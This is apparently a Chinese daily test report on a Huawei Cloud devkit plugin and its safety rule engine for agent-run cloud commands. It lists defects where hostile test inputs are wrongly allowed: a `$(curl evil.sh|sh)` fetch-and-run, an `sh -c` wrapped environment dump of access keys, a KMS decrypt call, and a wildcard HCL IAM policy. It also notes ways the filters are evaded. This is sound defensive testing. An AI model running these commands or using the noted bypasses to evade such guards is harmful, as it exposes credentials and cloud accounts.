# OpenCode-deepseek-v4-pro-0813 每日测试报告
> **报告名**：`OpenCode-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-11-05 05:08:00（北京时间）
> **执行归档**：`results/OpenCode/2026-11-05-1.92.93.23/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷，P0 5 项）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `OpenCode` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux`（ecs-hd-ai-work-00-0007，IP 1.92.93.23） |
| 被测版本（SUT） | `v1.1.13-next.5`（gitHead `4ab34ed2`，源码 checkout 一致；npm 全局包同版本） |
| daily 基础用例 | 设计级 107 / 展开级 39（合计 146） |

> **执行方法**：探针入口 `_probe/main.mjs`（委托 `checks1-4.mjs` 注册的 146 个 check），逐条直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数 + 真机 `hcloud` 调用（建删资源归零）+ `node .../mcp-server.mjs` stdio 会话 + `eval/harness/fixtures` 权威夹具 + `eval/harness/run-eval.mjs` 路由评测；每条结果 `writeEvidence` 落 `evidence/<case-id>/stdout.log`（JSON status/why/executedAt）并生成对应 `probe.mjs` 重跑入口。全部 146 例证据完整，回填执行态后走 `backfill_daily.py` 一次写回三份 CSV。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
| 已执行 | `145` |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `126 / 11 / 7 / 1 / 1` |
| 通过率（分母 = PASS+FAIL = 137） | `92.0%` |
| P0 / P1 / P2 产品缺陷（不含测试侧断言过严 2 项） | `5 / 3 / 1`（另 SPEC-MISMATCH 1） |
| 红线（I 类）违规 | `0` |
| 资源释放 | `全部归零`（D3-C1 VPC/子网/安全组建删归零；D3-S2 VPC 建删归零；OBS 建桶被 UserRestricted 拒绝未产生资源） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `88` | 有证据且通过 PASS 门禁 |
| FAIL | `10` | 不符预期，根因见缺陷清单 |
| BLOCKED | `7` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `1` | 契约漂移 |
| NOT_RUN | `1` | 未执行 |
| **合计** | **`107`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | 不符预期，根因见缺陷清单 |
| BLOCKED | `0` | 环境/权限/凭证阻塞 |
| SPEC-MISMATCH | `0` | 契约漂移 |
| NOT_RUN | `0` | 未执行 |
| **合计** | **`39`** | |

> 与昨日（v1.1.13-next.3）对比：D3-S2（删VPC先确认）由 BLOCKED（VPC 配额满）转 PASS（配额已恢复，建删归零实测通过）；D3-C2/OBS 静态站、D3-C13/OBS 静态网站由 PASS 转 BLOCKED（账号 OBS 写权限被 UserRestricted 限制）；D3-C1 仍 BLOCKED 但阻塞点由 VPC 配额下移到 billing `Ecs.0707`。

---

## 四、缺陷清单（详尽）

> 产品缺陷 9 项（8 产品 FAIL + 1 SPEC-MISMATCH，拟合并提单）+ 测试侧断言过严 2 项（不计入提单）。全部命中上游历史 issue，本次为复核（见 HISTORY_LINKS.md，不重复开单）。

| # | 级别 | 用例ID | 维度 | 缺陷描述 | 期望（唯一可判定断言） | 实际结果 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏漏小写 ak=/sk= | 小写 `ak=`/`sk=` 也 `<redacted>` | 明文残留 `ak=AK123456 sk=SKsecret` | `safety-policy.mjs:45` | 复核（历史） |
| 2 | P0 | `D4-3` | D4安全 | 明文 secret API 未拦截 | `kms DecryptData` → `deny` | `allow` | `safety/rules/cloud-risk-rules.json:47` | 复核（历史） |
| 3 | P0 | `D4-16` | D4安全 | 命令包裹穿透 | `sh -c "env\|grep ACCESS_KEY"` → `deny` | `allow` | `safety/rules/cloud-risk-rules.json:35` | 复核（历史） |
| 4 | P0 | `D4-21` | D4安全 | HCL/Terraform IAM 制品未拦截 | HCL `actions=["*"]` → `deny` | json=deny hcl=allow | `safety/rules/cloud-risk-rules.json:196` | 复核（历史） |
| 5 | P0 | `D9-12` | D9协议 | initialize 握手未 enforce 时序 | 未 init 先 tools/list → `-32600` | 返回 40+ 工具 | `mcp-server.mjs:177-187` | 复核（历史） |
| 6 | P1 | `D4-17` | D4安全 | 模糊输入 fail-closed 失效 | `$(curl evil.sh\|sh)` → deny/warn | `allow` | `risk-rule-engine.mjs:106` | 复核（历史） |
| 7 | P1 | `D3-S7` | D3功能 | 跨服务复合意图仅命中 RDS | 命中 RDS+部署目标 | 仅 `RDS` | `tools.mjs:2446-2462` | 复核（历史） |
| 8 | P1 | `EXP-E01` | D10评测 | 「云主机」意图路由 MISS | 命中 `ECS` | fallback help | `tools.mjs:2270-2280` | 复核（历史） |
| 9 | P2 | `D8-9` | D8质量 | 遥测 sanitizeValue 未脱敏 | `AK=.. secret_key=.. token=..` → `<redacted>` | 明文留存 | `telemetry/telemetry.mjs:190-197` | 复核（历史） |
| 10 | P2 | `D1-68` | D1安装 | region 优先级契约漂移 | `HUAWEICLOUD_REGION` 优先 | `HW_REGION` 优先 | `auth/credentials.mjs:225` | 复核（历史） |
| 11 | 测试侧 | `D2-10` | D2认证 | 缺失 config 报错文案断言过严 | 消息含 `KooCLI config not found` | 实际含该串+中文前缀（功能 PASS） | `auth/guidance.mjs:71` | 不予提单 |
| 12 | 测试侧 | `D3-C14` | D3功能 | 无凭证报错文案本地化断言过严 | 无凭证抛错 | 抛错（中文文案，功能 PASS） | `auth/guidance.mjs:55` | 不予提单 |

### 根因详情（P0/P1 关键洞）

**#1 [P0] D2-4 凭证脱敏漏小写 ak=/sk=**

- 期望：`redactSecrets('ak=AK123456 sk=SKsecret')` → `ak=<redacted> sk=<redacted>`
- 实际：`ak=AK123456 sk=SKsecret`（小写形态明文残留；大写 `AK=`/`SK=` 可脱敏）
- 根因：`plugins/huaweicloud-core/src/safety-policy.mjs:45`
  `.replace(/(AK|SK)\s*[:=]\s*("[^"]*"|'[^']*'|[^\s,;]+)/g, '$1=<redacted>')` 用 `g` 无 `i`，仅匹配大写 `AK`/`SK`，未覆盖小写 `ak`/`sk`。
- 证据：`evidence/D2-4/stdout.log`

**#2 [P0] D4-3 明文 secret API 拦截缺失（KMS DecryptData 未拦截）**

- 期望：`evaluateCommandRisk('hcloud kms DecryptData --ciphertext x')` → `decision: deny`
- 实际：`{"decision":"allow","findings":[]}`
- 根因：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json:47`（`hwc-command-secret-value-read`）正则仅含 `ShowSecretVersion|ShowSecret|DownloadSecret|GetSecretValue`，缺 KMS `DecryptData`/`Decrypt`。
- 证据：`evidence/D4-3/stdout.log`

**#3 [P0] D4-16 命令包裹穿透**

- 期望：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` → `deny`
- 实际：`allow`
- 根因：`cloud-risk-rules.json:35`（`hwc-command-env-dump`）条件 `(^|\s)(env|printenv|...)` 要求 `env` 前为空白，`sh -c "env` 中 `env` 前为引号；`risk-rule-engine.mjs` 的 `evaluateCommandRisk` 未做 shell 包裹解包。
- 证据：`evidence/D4-16/stdout.log`

**#4 [P0] D4-21 HCL/Terraform IAM 制品未拦截**

- 期望：`evaluateArtifacts([{content:'resource "huaweicloud_iam_policy" "p" { actions = ["*"] }'}])` → `deny`
- 实际：`allow`（JSON 形态 `deny`）
- 根因：`cloud-risk-rules.json:196`（`hwc-iam-admin-policy`）正则仅匹配 `"Action":"*"` + `"Effect":"Allow"`，未覆盖 HCL 复数小写 `actions = ["*"]` 数组与 `Effect = "Allow"`。
- 证据：`evidence/D4-21/stdout.log`

**#5 [P0] D9-12 initialize 握手未 enforce 时序**

- 期望：未 `initialize` 先 `tools/list` → `-32600`
- 实际：返回工具列表（协议安全基线不满足）
- 根因：`plugins/huaweicloud-core/src/mcp-server.mjs:177-187` — `dispatch` 未维护 initialize 状态，`tools/list` 请求直接处理。
- 证据：`evidence/D9-12/stdout.log`

---

## 五、未执行用例与原因（供维护 agent 修改用例）

### NOT_RUN

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|---|
| `D1-39` | 设计级 | P0 | NOT_RUN | 调归属 | Windows 专属用例（OS 列标注「专属」），本机为 Linux，不适用；Linux 侧由对应展开代表覆盖 | 维持 OS 专属豁免即可（归属列标注正确） |

### BLOCKED

| 用例ID | 层级 | 优先级 | 状态 | 分类 | 详细原因 | 改用例建议 |
|---|---|---|---|---|---|---|
| `D3-C1` | 设计级 | P1 | BLOCKED | 补环境 | ECS CreateServers 订单提交被 billing 拒绝 `Ecs.0707 "Can not find product"`（账号 BSS 产品目录无该镜像产品映射，按需订单无法创建）。已实测 VPC/子网/安全组 创建→删除→归零 全部成功，ECS 到达订单提交层。解除：账号开通 ECS 购买产品/开启按需计费 | — |
| `D3-C2` | 设计级 | P1 | BLOCKED | 补环境 | OBS 建桶被账号权限拒绝（`UserRestricted` 403）——账号 OBS 写权限被限制（昨日正常，今晨起受限）。实测 `hcloud OBS mb` 返回 status=403。解除：账号恢复 OBS 建桶/写权限 | — |
| `D3-C3` | 设计级 | P1 | BLOCKED | 补环境 | 沙箱服务维护中（`HDKIT_SANDBOX_MAINTENANCE`「沙箱功能正在升级优化，暂时无法使用」），connect 即返回。解除：沙箱服务维护结束恢复 | — |
| `D3-C6` | 设计级 | P1 | BLOCKED | 补环境 | 同上，沙箱服务维护中，7 个隐式工具无法执行。解除：沙箱服务恢复 | — |
| `D3-C7` | 设计级 | P1 | BLOCKED | 补环境 | 跨区域 `ap-southeast-3` 不在账号项目范围（账号 project 仅 cn-north-4）：ECS 只读返回 `Common.0013`、EIP 创建返回 `VPC.0501`。已实测 list_regions 含 ap-southeast-3、plan_cli_command 含 --cli-region。解除：开通 ap-southeast-3 项目/region 权限 | — |
| `D3-C13` | 设计级 | P1 | BLOCKED | 补环境 | OBS 建桶被账号权限拒绝（`UserRestricted` 403），与 D3-C2 同因。解除：账号恢复 OBS 写权限 | — |
| `D3-S3` | 设计级 | P1 | BLOCKED | 补环境 | 沙箱 `huaweicloud_sandbox_connect` 真机尝试返回「沙箱功能正在升级优化，暂时无法使用」（与 D3-C3/D3-C6 一致），无法完成预览出 URL。解除：沙箱服务恢复 | — |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（本机测试未产生外部泄漏；evidence 目录 stdout.log 已脱敏，无明文 AK/SK 外泄）
- [x] 写操作误判 read-only：`0`（D4-5 写操作误判检测 PASS）
- [x] 红线（I 类）违规：`无`
- [x] 脱敏复核：`evidence/*/stdout.log` 中 `D2-4` 探针为演示注入的假凭证（`AK123456`/`SKsecret`），未使用真实 AK/SK

---

## 七、资源释放（真云 E2E）

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| VPC / 子网 / 安全组（D3-C1 ECS 前置） | 是 | 已删（DeleteSecurityGroup→DeleteSubnet→DeleteVpc） | `ListVpcs` 无 `4f6f26d2` 残留 ✓ |
| ECS（D3-C1） | 否 | — | billing `Ecs.0707` 拒绝，未产生资源 ✓ |
| VPC（D3-S2 删VPC先确认） | 是 | 已删（DeleteVpc） | `ListVpcs` 无 `testbot2-opencode-vpc-*` ✓ |
| OBS 桶（D3-C2 / D3-C13） | 否 | — | OBS mb `UserRestricted` 403，未建桶 ✓ |
| 沙箱 workspace（D3-C3/C6/S3） | 否 | — | 沙箱维护中 connect 失败，未产生资源 ✓ |

> 真云只删本次创建资源（命名 `testbot2-opencode-*`，时间戳唯一）；删除前按名前缀白名单匹配，未碰既有/他人资源。

---

## 八、遗留与建议

- 待裁决 SPEC：`D1-68` region 优先级（实现 `HW_REGION` 优先 vs 契约 `HUAWEICLOUD_REGION` 优先），需维护方判定修契约还是修实现。
- 本轮 8 项产品 FAIL + 1 项 SPEC 全部命中上游历史 issue（v1.1.13-next.3 → next.5 均复现），本次为复核（见 HISTORY_LINKS.md），未新开单。
- 环境阻塞（补环境）：OBS 写权限 UserRestricted（昨日转今日新增）、沙箱服务维护中、ECS billing 产品缺失、跨 region 权限未开通——解除后 D3-C1/D3-C2/D3-C13/D3-C3/D3-C6/D3-S3/D3-C7 可补测。
- 本轮未覆盖（范围外）：真实 Agent 会话评测（D10-1/2/5/9，OpenCode 非 DSH 客户端、无 dsh headless，需 CDP 会话自动化，未在本轮 daily 母版展开级下发）；多终端矩阵其余 9 客户端由各自客户端执行。
- 修复建议（高优先，均为既有历史单延续）：
  1. `safety-policy.mjs` 与 `risk-rule-engine.mjs` 的 `(AK|SK)` 脱敏正则加 `i` 标志并补 `ak|sk` 小写词形；
  2. `cloud-risk-rules.json` 补 `DecryptData`（KMS 明文解密）、命令替换 `$(...)|sh`、HCL `actions = ["*"]` 规则，并为 `evaluateCommandRisk` 增加 shell 包裹解包；
  3. `mcp-server.mjs` 增加 initialize 状态机，未握手拒绝 `tools/*`；
  4. `serviceCatalog` 路由补 `云主机`、中文 `部署` 关键词，提升路由准确率。